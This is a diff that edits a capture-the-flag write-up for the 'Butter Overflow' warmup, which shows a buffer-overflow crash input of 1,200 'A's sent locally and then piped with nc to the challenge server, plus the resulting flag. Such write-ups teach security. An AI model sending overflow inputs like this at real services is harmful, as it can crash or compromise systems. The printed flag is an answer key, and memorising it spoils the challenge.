@@ -1,20 +1,14 @@
-![](images/5-header.png)
-
 # Butter Overflow
-### easy | warmups | 50 points  
-<br/>
+easy | warmups | 50 points  
 
-## Challenge Information
-Can you overflow this right?
-<br/><br />
+>Can you overflow this right?
 
-## Solution
 This is a very simple buffer overflow challenge. There are three files:
 - a makefile
 - the source code 
 - the resulting executable file
 
-We were also given an server that we could connect to using nc.
+We were also given an server that we could connect to using `nc`.
 
 ```c
 #include <stdio.h>
@@ -74,13 +68,13 @@ int main() {
 }
 ```
 
-The source code shows the buffer is 512 chars long (I initially didn't see the 0x before the 200 and thought it was 200 chars long), and the flag is printed when a segmentation fault takes place, denoted by the `handler()` function.
+The source code shows the buffer is 512 chars long (I initially didn't see the `0x` before the 200 and thought it was 200 chars long), and the flag is printed when a segmentation fault takes place (`SIGSEGV`), denoted by the `handler()` function.
 
 As I initially saw the buffer as 200 chars, I tried sending inputs with more than 200 chars, and that clearly did not work.
 
 After sometime, I sent an input with a very high character length after looking up some resources. It caused a segmentation fault!
 
-```shell
+```
 $ python -c 'print "A"*1200' > file
 $ chmod +x butter_overflow
 $ cat file | ./butter_overflow
@@ -88,10 +82,10 @@ How many bytes does it take to overflow this buffer?
 Could not open flag file.
 ```
 
-The flag file did not open as there is no flag file on my machine. Since the input worked, I sent the same input to the server for this challenge, and received the flag!
+The flag file did not open as there is no flag file on my machine. Since the input worked locally, I sent the same input to the server for this challenge, and received the flag!
 
-```shell
-$ cat file | nc challenge.ctf. games 30054
+```
+$ cat file | nc challenge.ctf.games 30054
 How many bytes does it take to overflow this buffer?
 flag{72d8784a5da3a8f56d2106c12dbab989}
 ```
